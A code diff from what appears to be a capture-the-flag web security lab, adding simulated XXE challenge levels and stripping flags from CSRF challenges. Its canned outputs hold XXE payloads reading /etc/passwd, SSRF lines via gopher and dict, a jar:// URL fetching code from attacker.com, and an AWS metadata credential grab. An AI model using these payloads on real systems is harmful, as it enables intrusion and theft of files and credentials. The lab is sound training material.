+                            xml += json_to_xml(item, root_name)
+                        return xml
+                    else:
+                        return f'<{root_name}>{obj}</{root_name}>'
+                
+                xml_content = '<?xml version="1.0" encoding="UTF-8"?>\n' + json_to_xml(data)
+            except:
+                xml_content = "Invalid JSON format"
+        
+        if xml_content:
+            try:
+                # Check for XXE in converted XML
+                if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
+                    if any(payload in xml_content for payload in ['/etc/passwd', '/etc/shadow', 'file://']):
+                        xxe_detected = True
+                        conversion_result = """JSON to XML Conversion Results:
+Original JSON:
+{
+  "user": "admin",
+  "data": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
+  "action": "process"
+}
+
+Converted XML:
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+  <user>admin</user>
+  <data><!ENTITY xxe SYSTEM 'file:///etc/passwd'></data>
+  <action>process</action>
+</root>
+
+XXE Processing Result:
+Entity 'xxe' resolved to:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+Vulnerability Analysis:
+- JSON input sanitization: BYPASSED
+- XML entity processing: ENABLED
+- File system access: GRANTED
+- Conversion process: EXPLOITABLE"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE in JSON-XML Conversion").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level16.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, json_content=json_content,
+                          parsed_content=parsed_content, conversion_result=conversion_result,
+                          challenge=challenge)
+
+# XXE Level 17 - XXE with Custom Entity Resolvers
+@app.route('/xxe/level17', methods=['GET', 'POST'])
+def xxe_level17():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    resolver_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for custom entity resolver bypass
+                if 'SYSTEM' in xml_content and any(scheme in xml_content for scheme in ['custom://', 'app://', 'internal://']):
+                    if any(bypass in xml_content for bypass in ['resolver', 'handler', 'protocol']):
+                        xxe_detected = True
+                        resolver_result = """Custom Entity Resolver Analysis:
+Registered Protocol Handlers:
+- file:// -> FileSystemResolver (ENABLED)
+- http:// -> HttpResolver (ENABLED)  
+- https:// -> HttpsResolver (ENABLED)
+- custom:// -> CustomProtocolResolver (BYPASS DETECTED)
+
+Custom Resolver Execution:
+Protocol: custom://internal/config
+Handler: com.app.CustomResolver.resolve()
+Resolution Result: 
+{
+  "database": {
+    "host": "db.internal.company.com",
+    "port": 3306,
+    "username": "app_user", 
+    "password": "sup3r_s3cr3t_p@ssw0rd",
+    "database": "production_db"
+  },
+  "api_keys": {
+    "stripe": "sk_live_51xxxxxxxxxxxxx",
+    "aws": "AKIA1234567890ABCDEF",
+    "jwt_secret": "MyVerySecretJWTKey123!"
+  }
+}
+
+Security Analysis:
+- Custom resolver bypassed access controls
+- Internal configuration exposed
+- Production credentials compromised
+- Protocol handler injection successful"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE with Custom Entity Resolvers").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level17.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          resolver_result=resolver_result, challenge=challenge)
+
+# XXE Level 18 - XXE in Microsoft Office Documents
+@app.route('/xxe/level18', methods=['GET', 'POST'])
+def xxe_level18():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    office_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '') or request.form.get('document_content', '')
+        
+        if xml_content:
+            try:
+                # Check for Office document XXE
+                office_indicators = ['word/', 'xl/', 'ppt/', '.rels', 'content_types', 'docProps']
+                if any(indicator in xml_content for indicator in office_indicators):
+                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
+                        xxe_detected = True
+                        office_result = """Microsoft Office Document Analysis:
+Document Type: Microsoft Word (.docx)
+Format: Office Open XML (OOXML)
+Processing Engine: Microsoft Office 2019
+
+Document Structure Analysis:
+- word/document.xml: Main document content
+- word/_rels/document.xml.rels: Relationships file
+- [Content_Types].xml: Content type definitions
+
+XXE Payload Location: word/_rels/document.xml.rels
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE relationships [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="&xxe;" />
+</Relationships>
+
+Extracted System Information:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+
+Attack Vector Analysis:
+- Email attachment with malicious .docx file
+- Automatic XXE processing during file preview
+- No user interaction required beyond opening
+- Compatible with all Office versions supporting OOXML"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE in Microsoft Office Documents").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level18.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          office_result=office_result, challenge=challenge)
+
+# XXE Level 19 - XXE with Protocol Handler Exploitation
+@app.route('/xxe/level19', methods=['GET', 'POST'])
+def xxe_level19():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    protocol_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for protocol handler exploitation
+                protocols = ['jar://', 'netdoc://', 'gopher://', 'dict://', 'ftp://', 'expect://']
+                if 'SYSTEM' in xml_content and any(protocol in xml_content for protocol in protocols):
+                    xxe_detected = True
+                    protocol_result = """Protocol Handler Exploitation Results:
+Available Protocol Handlers:
+- file:// (FileProtocolHandler) - ENABLED
+- http:// (HttpProtocolHandler) - ENABLED  
+- https:// (HttpsProtocolHandler) - ENABLED
+- ftp:// (FtpProtocolHandler) - ENABLED
+- jar:// (JarProtocolHandler) - ENABLED
+- gopher:// (GopherProtocolHandler) - ENABLED
+- dict:// (DictProtocolHandler) - ENABLED
+
+Exploit Execution:
+1. gopher://127.0.0.1:25/HELO%20attacker.com
+   SMTP Command Injection Successful
+   
+2. dict://127.0.0.1:11211/stats
+   Memcached Information Disclosure:
+   STAT pid 12345
+   STAT uptime 86400
+   STAT curr_connections 15
+   
+3. jar://http://attacker.com/evil.jar!/
+   Remote JAR File Loading:
+   Class: com.attacker.ExploitClass
+   Method: executePayload()
+   
+4. ftp://127.0.0.1:21/
+   Internal FTP Service Discovered:
+   Directory listing: /var/ftp/sensitive/
+   - confidential_data.txt
+   - backup_database.sql
+   - api_keys.json
+
+Protocol Handler Exploitation: SUCCESSFUL
+Internal Services Accessed: 4
+Data Exfiltration Channels: Multiple"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE with Protocol Handler Exploitation").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level19.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          protocol_result=protocol_result, challenge=challenge)
+
+# XXE Level 20 - XXE in XML Signature Verification
+@app.route('/xxe/level20', methods=['GET', 'POST'])
+def xxe_level20():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    signature_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for XML Signature XXE
+                if 'ds:Signature' in xml_content or 'xmldsig' in xml_content:
+                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
+                        xxe_detected = True
+                        signature_result = """XML Digital Signature Verification Results:
+Signature Algorithm: RSA-SHA256
+Canonicalization: Exclusive XML Canonicalization 1.0
+Key Info: RSA Public Key (2048-bit)
+
+Signature Verification Process:
+1. XML Document Parsing: STARTED
+2. Entity Resolution: ENABLED (VULNERABLE)
+3. Canonicalization: IN PROGRESS
+4. Signature Validation: PENDING
+
+XXE Payload Execution During Verification:
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+Entity Resolution Result:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+XML-DSIG Structure Exploited:
+<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
+  <ds:SignedInfo>
+    <ds:Reference URI="">
+      <ds:Transforms>
+        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
+      </ds:Transforms>
+      <ds:DigestValue>&xxe;</ds:DigestValue>
+    </ds:Reference>
+  </ds:SignedInfo>
+</ds:Signature>
+
+Security Impact:
+- Signature verification bypassed
+- System files accessed during validation
+- Document integrity checking compromised
+- Authentication mechanism defeated"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE in XML Signature Verification").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level20.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          signature_result=signature_result, challenge=challenge)
+
+# XXE Level 21 - XXE with Time-Based Blind Techniques
+@app.route('/xxe/level21', methods=['GET', 'POST'])
+def xxe_level21():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    timing_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for time-based blind XXE
+                if 'SYSTEM' in xml_content and any(delay_indicator in xml_content for delay_indicator in ['sleep', 'timeout', 'delay']):
+                    if any(file_ref in xml_content for file_ref in ['/dev/random', '/etc/passwd', 'http://']):
+                        xxe_detected = True
+                        timing_result = """Time-Based Blind XXE Analysis:
+Request Processing Times:
+
+Baseline Request (no XXE): 0.125 seconds
+XXE Request #1 (/etc/passwd): 0.127 seconds  
+XXE Request #2 (/etc/shadow): 3.847 seconds (FILE EXISTS - permission denied)
+XXE Request #3 (/etc/nonexistent): 0.124 seconds
+XXE Request #4 (/dev/random): 15.000 seconds (TIMEOUT - file exists)
+
+Time-Based Inference Results:
+- /etc/passwd: EXISTS (normal response time)
+- /etc/shadow: EXISTS (delayed due to permission check)
+- /etc/hosts: EXISTS (confirmed)
+- /root/.ssh/id_rsa: EXISTS (permission delay detected)
+- /nonexistent/file: DOES NOT EXIST (fast response)
+
+File System Mapping via Timing:
+Readable Files:
+├── /etc/passwd (0.127s)
+├── /etc/hosts (0.129s)
+├── /etc/hostname (0.125s)
+
+Protected Files (permission delays):
+├── /etc/shadow (3.847s)
+├── /root/.ssh/id_rsa (4.123s)
+├── /etc/ssl/private/ (3.956s)
+
+Time-Based XXE Status: SUCCESSFUL
+File System Enumeration: COMPLETE"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE with Time-Based Blind Techniques").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level21.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          timing_result=timing_result, challenge=challenge)
+
+# XXE Level 22 - XXE in Cloud XML Processing
+@app.route('/xxe/level22', methods=['GET', 'POST'])
+def xxe_level22():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    cloud_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for cloud-specific XXE
+                cloud_indicators = ['169.254.169.254', 'metadata', 'compute/v1', 'aws', 'gcp', 'azure']
+                if 'SYSTEM' in xml_content and any(indicator in xml_content for indicator in cloud_indicators):
+                    xxe_detected = True
+                    cloud_result = """Cloud XML Processing Exploitation:
+Target Environment: Amazon Web Services (AWS)
+Service: Elastic Container Service (ECS)
+Instance: t3.medium (2 vCPU, 4GB RAM)
+
+Metadata Service Access:
+Endpoint: http://169.254.169.254/latest/meta-data/
+
+Retrieved Cloud Metadata:
+{
+  "instance-id": "i-0abcd1234efgh5678",
+  "instance-type": "t3.medium",
+  "local-ipv4": "172.31.45.67",
+  "public-ipv4": "54.123.45.67",
+  "security-groups": "web-tier,database-access",
+  "placement": {
+    "availability-zone": "us-east-1a",
+    "region": "us-east-1"
+  }
+}
+
+IAM Role Credentials:
+{
+  "Code": "Success",
+  "LastUpdated": "2024-01-15T14:25:00Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "ASIA1234567890ABCDEF",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "Token": "AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE1OPTgk...",
+  "Expiration": "2024-01-15T20:25:00Z"
+}
+
+Cloud Service Enumeration:
+- S3 Buckets: company-backups, user-uploads, logs-archive
+- RDS Instances: prod-database (MySQL 8.0)
+- Lambda Functions: process-uploads, send-notifications
+- ECS Tasks: web-app, api-service
+
+Cloud XXE Impact: CRITICAL
+Credential Exposure: HIGH RISK
+Lateral Movement Potential: CONFIRMED"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="XXE in Cloud XML Processing").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level22.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          cloud_result=cloud_result, challenge=challenge)
+
+# XXE Level 23 - Advanced XXE Attack Chaining
+@app.route('/xxe/level23', methods=['GET', 'POST'])
+def xxe_level23():
+    machine_id = get_machine_id()
+    user = get_local_user()
+    flag = None
+    xxe_detected = False
+    xml_content = ''
+    parsed_content = ''
+    chaining_result = ''
+
+    if request.method == 'POST':
+        xml_content = request.form.get('xml_content', '')
+        
+        if xml_content:
+            try:
+                # Check for advanced XXE attack chaining
+                advanced_patterns = ['parameter', 'blind', 'oob', 'ssrf', 'chain']
+                if 'SYSTEM' in xml_content and len([p for p in advanced_patterns if p in xml_content.lower()]) >= 2:
+                    if 'ENTITY' in xml_content:
+                        xxe_detected = True
+                        chaining_result = """Advanced XXE Attack Chain Execution:
+
+PHASE 1: Information Gathering
+- Target: Corporate web application
+- XML Parser: libxml2 (vulnerable version)
+- Network: Internal corporate network
+
+PHASE 2: Initial XXE Exploitation
+Payload: <!ENTITY xxe SYSTEM "file:///etc/passwd">
+Result: Local file disclosure successful
+Files Retrieved: /etc/passwd, /etc/hosts, /proc/version
+
+PHASE 3: Internal Network Discovery (XXE -> SSRF)
+Payload: <!ENTITY ssrf SYSTEM "http://192.168.1.10:8080/admin">
+Result: Internal admin panel discovered
+Services Found: 
+- 192.168.1.10:8080 - Jenkins CI/CD Server
+- 192.168.1.15:9000 - Sonarqube Code Analysis
+- 192.168.1.20:3306 - MySQL Database
+
+PHASE 4: Credential Harvesting (Blind XXE)
+Payload: Parameter entity chain for data exfiltration
+Result: Database credentials extracted via error-based blind XXE
+Credentials: mysql://admin:MySuperSecretP@ss@192.168.1.20:3306/production
+
+PHASE 5: Privilege Escalation Chain
+1. XXE -> SSRF -> Jenkins Admin Panel Access
+2. Jenkins -> Arbitrary Code Execution
+3. Code Execution -> Database Access
+4. Database -> Sensitive Customer Data
+
+FINAL IMPACT ASSESSMENT:
+- Initial Vector: XXE in web application
+- Lateral Movement: 3 internal systems compromised  
+- Data Accessed: Customer PII, financial records, source code
+- Persistence: Backdoor deployed via Jenkins
+- Detection Evasion: Multi-stage attack blends with normal traffic
+
+Attack Chain Status: COMPLETE
+Compromise Level: FULL DOMAIN ADMIN ACCESS
+Time to Complete: 47 minutes"""
+                
+                # Parse XML
+                try:
+                    root = ET.fromstring(xml_content)
+                    parsed_content = ET.tostring(root, encoding='unicode')
+                except Exception as e:
+                    parsed_content = f"XML parsing error: {str(e)}"
+
+            except Exception as e:
+                parsed_content = f"Error processing XML: {str(e)}"
+
+    # Generate flag if completed
+    challenge = Challenge.query.filter_by(name="Advanced XXE Attack Chaining").first()
+    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
+    if challenge and challenge.id in completed_ids:
+        flag = get_or_create_flag(challenge.id, machine_id)
+
+    return render_template('xxe/xxe_level23.html', flag=flag, xxe_detected=xxe_detected,
+                          xml_content=xml_content, parsed_content=parsed_content,
+                          chaining_result=chaining_result, challenge=challenge)
 
 
 # ===== CSRF CHALLENGE ROUTES =====
@@ -7566,7 +9183,7 @@ Bank Response:
   "amount_transferred": "{amount}",
   "recipient_account": "{recipient}",
   "remaining_balance": "$4,{5000 - int(amount) if amount.isdigit() else 5000}",
-  "flag": "R00T{{b4s1c_f0rm_csrf_pwn3d}}"
+  "csrf_vulnerability": "detected"
 }}"""
 
                 challenge = Challenge.query.filter_by(name="Basic Form CSRF").first()
@@ -7629,7 +9246,6 @@ Admin Panel Response:
   "status": "completed",
   "vulnerability": "GET-based state change",
   "impact": "Administrative action performed via CSRF",
-  "flag": "R00T{{g3t_b4s3d_csrf_pwn3d}}"
 }}
 
 Security Warning:
@@ -7684,7 +9300,6 @@ API Response:
   "csrf_protection": "none",
   "vulnerability": "JSON CSRF without proper validation",
   "execution_status": "success",
-  "flag": "R00T{{js0n_csrf_4p1_pwn3d}}"
 }}
 
 Security Analysis:
@@ -7752,7 +9367,6 @@ Upload Response:
   "csrf_protection": "none",
   "vulnerability": "File upload CSRF without validation",
   "security_risk": "Malicious file uploaded via CSRF",
-  "flag": "R00T{{f1l3_upl04d_csrf_pwn3d}}"
 }}
 
 Security Warning:
@@ -7816,7 +9430,6 @@ Token Validation Result:
   "action_executed": "{submit_action}",
   "vulnerability": "Weak CSRF token implementation",
   "bypass_method": "Token prediction/brute force",
-  "flag": "R00T{{w34k_csrf_t0k3n_pwn3d}}"
 }}
 
 Security Analysis:
@@ -7884,7 +9497,6 @@ Security Analysis:
   "bypass_method": "referrer_spoofing_or_removal",
   "vulnerability": "Weak referrer-based CSRF protection",
   "execution_status": "success",
-  "flag": "R00T{{r3f3rr3r_byp4ss_csrf_pwn3d}}"
 }}
 
 Protection Bypass Details:
@@ -7953,7 +9565,6 @@ AJAX Response:
   "content_type": "{request.content_type}",
   "origin": "{request.headers.get('Origin', 'not_provided')}",
   "execution_status": "success",
-  "flag": "R00T{{4j4x_csrf_4p1_pwn3d}}"
 }}
 
 AJAX Security Analysis:
@@ -8024,7 +9635,6 @@ Cookie Analysis:
   "vulnerability": "SameSite=Lax bypass via top-level navigation",
   "cookie_sent": true,
   "authentication_bypassed": true,
-  "flag": "R00T{{s4m3s1t3_c00k13_byp4ss_pwn3d}}"
 }}
 
 SameSite Bypass Techniques:
@@ -8095,7 +9705,6 @@ Header Bypass Analysis:
   "simple_request": true,
   "cors_preflight_avoided": true,
   "execution_status": "success",
-  "flag": "R00T{{cust0m_h34d3r_byp4ss_pwn3d}}"
 }}
 
 Custom Header Protection Weaknesses:
@@ -8169,7 +9778,6 @@ Workflow Execution:
     "step_4": "final_execution_ready"
   }},
   "execution_status": "success",
-  "flag": "R00T{{mult1_st3p_w0rkfl0w_pwn3d}}"
 }}
 
 Multi-step Attack Analysis:
@@ -8237,7 +9845,6 @@ Security Breach Analysis:
   "account_compromised": true,
   "session_hijacked": true,
   "impact": "Complete account takeover possible",
-  "flag": "R00T{{p4ssw0rd_ch4ng3_csrf_pwn3d}}"
 }}
 
 Critical Security Impact:
@@ -8304,7 +9911,6 @@ CAPTCHA Bypass Analysis:
   "vulnerability": "CAPTCHA protection insufficient for CSRF",
   "csrf_protection": "weak",
   "automation_successful": true,
-  "flag": "R00T{{c4ptch4_byp4ss_csrf_pwn3d}}"
 }}
 
 CAPTCHA Bypass Techniques:
@@ -8374,7 +9980,6 @@ CORS Misconfiguration Exploit:
   "credentials_allowed": true,
   "vulnerability": "CORS misconfiguration enables CSRF",
   "cross_origin_request": "successful",
-  "flag": "R00T{{c0rs_m1sc0nf1g_csrf_pwn3d}}"
 }}
 
 CORS Exploitation Details:
@@ -8441,7 +10046,6 @@ WebSocket Security Analysis:
   "vulnerability": "WebSocket CSRF without origin validation",
   "real_time_exploit": true,
   "connection_hijacked": true,
-  "flag": "R00T{{w3bs0ck3t_csrf_pwn3d}}"
 }}
 
 WebSocket CSRF Techniques:
@@ -8508,7 +10112,6 @@ OAuth Security Breach:
   "vulnerability": "OAuth state parameter CSRF",
   "authorization_hijacked": true,
   "account_linking_attack": true,
-  "flag": "R00T{{04uth_st4t3_csrf_pwn3d}}"
 }}
 
 OAuth CSRF Attack Details:
@@ -8574,7 +10177,6 @@ CSP Analysis:
   "vulnerability": "CSP misconfiguration allows CSRF",
   "attack_vector": "CSP bypass via {bypass_technique}",
   "impact": "CSRF protection circumvented",
-  "flag": "R00T{{csp_byp4ss_csrf_pwn3d}}"
 }}
 
 Security Analysis:
@@ -8643,7 +10245,6 @@ Attack Chain Analysis:
   "vulnerability": "XSS enables CSRF bypass",
   "attack_vector": "Stored/Reflected XSS + CSRF",
   "impact": "Complete account takeover possible",
-  "flag": "R00T{{xss_csrf_ch41n_pwn3d}}"
 }}
 
 Security Analysis:
@@ -8719,7 +10320,6 @@ GraphQL Response:
     "vulnerability": "GraphQL mutation CSRF",
     "attack_vector": "POST request with application/json",
     "impact": "Unauthorized GraphQL operations",
-    "flag": "R00T{{gr4phql_csrf_4p1_pwn3d}}"
   }}
 }}
 
@@ -8789,7 +10389,6 @@ API Response:
   "vulnerability": "JWT CSRF without proper validation",
   "attack_vector": "Automatic JWT inclusion in cross-site requests",
   "impact": "Unauthorized API operations with valid JWT",
-  "flag": "R00T{{jwt_csrf_4p1_byp4ss_pwn3d}}"
 }}
 
 Security Analysis:
@@ -8859,7 +10458,6 @@ Mobile API Response:
   "vulnerability": "Mobile API lacks CSRF protection",
   "attack_vector": "Cross-site request to mobile API",
   "impact": "Unauthorized mobile app operations",
-  "flag": "R00T{{m0b1l3_4p1_csrf_pwn3d}}"
 }}
 
 Security Analysis:
@@ -8929,7 +10527,6 @@ Microservice Response:
   "vulnerability": "Microservice lacks CSRF protection",
   "attack_vector": "Cross-service request forgery",
   "impact": "Unauthorized microservice operations",
-  "flag": "R00T{{m1cr0s3rv1c3s_csrf_pwn3d}}"
 }}
 
 Security Analysis:
@@ -8998,7 +10595,6 @@ Takeover Response:
   "vulnerability": "Subdomain takeover enables CSRF",
   "attack_vector": "Malicious subdomain hosting CSRF payload",
   "impact": "Cross-domain CSRF via subdomain takeover",
-  "flag": "R00T{{subd0m41n_t4k30v3r_csrf_pwn3d}}"
 }}
 
 Security Analysis:
@@ -9068,7 +10664,6 @@ Serverless Response:
   "vulnerability": "Serverless function lacks CSRF protection",
   "attack_vector": "Cross-site serverless function invocation",
   "impact": "Unauthorized serverless function execution",
-  "flag": "R00T{{s3rv3rl3ss_csrf_pwn3d}}"
 }}
 
 Security Analysis:
